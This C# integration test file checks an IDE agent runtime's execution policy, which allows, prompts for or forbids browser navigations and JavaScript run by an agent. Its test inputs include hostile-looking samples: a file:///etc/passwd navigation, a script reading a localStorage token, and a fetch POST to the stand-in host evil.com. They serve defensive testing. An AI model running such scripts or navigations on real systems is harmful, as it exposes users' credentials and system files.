using System.Text.Json;
using FluentAssertions;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime.Abstractions;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime.Core;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime.ExecPolicy;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime.Events;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime.Hooks;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime.Models;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime.Permissions;
using Libr4.IDE.Application.AutonomousAppGeneration.AgentRuntime.Tools.Browser;
using Libr4.IDE.Application.AutonomousAppGeneration.Runtime;
using Libr4.IDE.Application.AutonomousAppGeneration.Services;
using Libr4.IDE.Domain.AutonomousAppGeneration;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using Xunit;

namespace Libr4.IntegrationTests.IDE;

public sealed class ObscuraExecPolicyTests : IDisposable
{
    private readonly string _runsRoot;

    public ObscuraExecPolicyTests()
    {
        _runsRoot = Path.Combine(Path.GetTempPath(), $"obscura-exec-policy-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_runsRoot);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_runsRoot))
                Directory.Delete(_runsRoot, recursive: true);
        }
        catch
        {
            // best-effort
        }
    }

    [Theory]
    [InlineData("file:///etc/passwd", ExecPolicyDecision.Forbid)]
    [InlineData("http://localhost:5173", ExecPolicyDecision.Allow)]
    [InlineData("http://127.0.0.1:8000/api", ExecPolicyDecision.Allow)]
    [InlineData("https://example.com", ExecPolicyDecision.Prompt)]
    public void EvaluateUrl_AppliesConfiguredRules(string url, ExecPolicyDecision expected)
    {
        var engine = CreateEngine();
        engine.Evaluate(BrowserToolNames.Navigate, url).Decision.Should().Be(expected);
    }

    [Theory]
    [InlineData("localStorage.getItem('token')", ExecPolicyDecision.Forbid)]
    [InlineData("fetch('https://evil.com', { method: 'POST' })", ExecPolicyDecision.Prompt)]
    [InlineData("document.querySelector('h1').textContent", ExecPolicyDecision.Allow)]
    public void EvaluateScript_DetectsExfiltrationPatterns(string script, ExecPolicyDecision expected)
    {
        var engine = CreateEngine();
        var result = engine.Evaluate(BrowserToolNames.ExecuteJs, script);
        result.Decision.Should().Be(expected, because: $"{result.Reason} / {result.MatchedRule}");
    }

    [Fact]
    public async Task Hook_ForbidsFileProtocolNavigate()
    {
        var hook = new ObscuraExecPolicyToolHook(CreateEngine());
        var tool = new StubBrowserTool(BrowserToolNames.Navigate);
        var context = BuildContext(Guid.NewGuid(), """{ "url": "file:///tmp/x" }""");

        var act = () => hook.OnBeforeToolAsync(tool, context, CancellationToken.None).AsTask();
        await act.Should().ThrowAsync<InvalidOperationException>()
            .WithMessage("*obscura_execpolicy_forbid*");
    }

    [Fact]
    public async Task Hook_PromptsExternalHttpsWithoutConsent()
    {
        var runId = Guid.NewGuid();
        var hook = new ObscuraExecPolicyToolHook(
            CreateEngine(),
            permissionStore: new AgentRunPermissionStore());
        var tool = new StubBrowserTool(BrowserToolNames.Navigate);
        var context = BuildContext(runId, """{ "url": "https://shop.example.com" }""");

        var act = () => hook.OnBeforeToolAsync(tool, context, CancellationToken.None).AsTask();
        await act.Should().ThrowAsync<InvalidOperationException>()
            .WithMessage("*obscura_execpolicy_prompt*");
    }

    [Fact]
    public async Task Hook_AllowsExternalHttpsAfterConsent()
    {
        var runId = Guid.NewGuid();
        var store = new AgentRunPermissionStore();
        var url = "https://shop.example.com";
        var hook = new ObscuraExecPolicyToolHook(CreateEngine(), permissionStore: store);
        var tool = new StubBrowserTool(BrowserToolNames.Navigate);
        var context = BuildContext(runId, $$"""{ "url": "{{url}}" }""");

        try
        {
            await hook.OnBeforeToolAsync(tool, context, CancellationToken.None);
        }
        catch (InvalidOperationException)
        {
            // first call enqueues prompt
        }

        var prompt = store.GetPendingPrompts(runId).Should().ContainSingle().Subject;
        prompt.Kind.Should().Be("obscura_execpolicy");
        store.ResolvePrompt(runId, prompt.Id, accepted: true);

        var act = () => hook.OnBeforeToolAsync(tool, context, CancellationToken.None).AsTask();
        await act.Should().NotThrowAsync();
    }

    [Fact]
    public async Task Audit_WritesObscuraExecAuditJsonlPerRun()
    {
        var runId = Guid.NewGuid();
        var audit = new ObscuraExecPolicyJsonlAudit(Options.Create(new AgentRuntimeOptions { RunsRoot = _runsRoot }));
        var hook = new ObscuraExecPolicyToolHook(CreateEngine(), audit);
        var tool = new StubBrowserTool(BrowserToolNames.Navigate);
        var context = BuildContext(runId, """{ "url": "http://localhost:3000" }""");

        await hook.OnBeforeToolAsync(tool, context, CancellationToken.None);

        var path = Path.Combine(_runsRoot, runId.ToString("D"), "obscura-exec-audit.jsonl");
        File.Exists(path).Should().BeTrue();
        File.ReadAllText(path).Should().Contain("browser_navigate");
        File.ReadAllText(path).Should().Contain("http://localhost:3000");
    }

    [Fact]
    public async Task Hook_EmitsExecPolicyPromptNdjsonEvent()
    {
        var runId = Guid.NewGuid();
        var ndjson = new CapturingNdjsonWriter();
        var hook = new ObscuraExecPolicyToolHook(
            CreateEngine(),
            permissionStore: new AgentRunPermissionStore(),
            ndjson: ndjson);
        var tool = new StubBrowserTool(BrowserToolNames.Navigate);
        var context = BuildContext(runId, """{ "url": "https://shop.example.com" }""");

        var act = () => hook.OnBeforeToolAsync(tool, context, CancellationToken.None).AsTask();
        await act.Should().ThrowAsync<InvalidOperationException>()
            .WithMessage("*obscura_execpolicy_prompt*");

        ndjson.Events.Should().ContainSingle();
        using var doc = JsonDocument.Parse(JsonSerializer.Serialize(ndjson.Events[0]));
        doc.RootElement.GetProperty("type").GetString().Should().Be("obscura_execpolicy_prompt");
        doc.RootElement.GetProperty("toolName").GetString().Should().Be(BrowserToolNames.Navigate);
        doc.RootElement.GetProperty("target").GetString().Should().Be("https://shop.example.com");
    }

    private YamlObscuraExecPolicyEngine CreateEngine()
    {
        var policyPath = ResolvePolicyPath();
        return new YamlObscuraExecPolicyEngine(
            Options.Create(new AgentRuntimeOptions { ObscuraExecPolicyPath = policyPath }),
            NullLogger<YamlObscuraExecPolicyEngine>.Instance);
    }

    private static string ResolvePolicyPath()
    {
        var candidates = new[]
        {
            Path.Combine(AppContext.BaseDirectory, "AgentRuntime", "Config", "obscura-exec-policy.yaml"),
            Path.GetFullPath(Path.Combine(
                AppContext.BaseDirectory,
                "..", "..", "..", "..",
                "src", "Services", "IDE", "Libr4.IDE.AutonomousAppGeneration",
                "AgentRuntime", "Config", "obscura-exec-policy.yaml"))
        };

        return candidates.First(File.Exists);
    }

    private static ToolContext BuildContext(Guid runId, string inputJson)
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "libr4-obscura-policy-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempDir);
        var input = JsonDocument.Parse(inputJson).RootElement;
        return new ToolContext
        {
            Workspace = new ShadowWorkspaceContext(Guid.NewGuid(), tempDir, string.Empty, new StubRuntimeSession()),
            Accessor = null!,
            WorkingFiles = new List<GeneratedFile>(),
            FileState = new FileStateCache(),
            Plan = null,
            Mode = AgentSessionMode.Repair,
            Session = new AgentSessionState { RunId = runId },
            ToolInput = input
        };
    }

    private sealed class StubBrowserTool(string name) : IAgentTool
    {
        public string Name { get; } = name;
        public string Description => "stub";
        public bool IsReadOnly => true;
        public bool IsConcurrencySafe(JsonElement input) => true;

        public Task<ToolExecutionResult> ExecuteAsync(JsonElement input, ToolContext context, CancellationToken ct) =>
            Task.FromResult(new ToolExecutionResult(Name, true, "ok", Array.Empty<GeneratedFile>()));
    }

    private sealed class StubRuntimeSession : IRuntimeSession
    {
        public string ProviderName => "stub";
        public string SessionId => "stub";
        public string HostMountPath => string.Empty;
        public string GuestMountPath => "/workspace";
        public string Image => "stub";
        public Task<ExecResult> ExecAsync(
            string command,
            string workingSubDirectory,
            IDictionary<string, string>? environmentVariables = null,
            TimeSpan? timeout = null,
            CancellationToken ct = default) =>
            Task.FromResult(new ExecResult(0, TimeSpan.Zero, Array.Empty<ConsoleLogEntry>()));
        public ValueTask DisposeAsync() => ValueTask.CompletedTask;
    }

    private sealed class CapturingNdjsonWriter : INdjsonEventWriter
    {
        public List<object> Events { get; } = new();

        public Task WriteAsync(Guid runId, object evt, CancellationToken ct = default)
        {
            Events.Add(evt);
            return Task.CompletedTask;
        }
    }
}
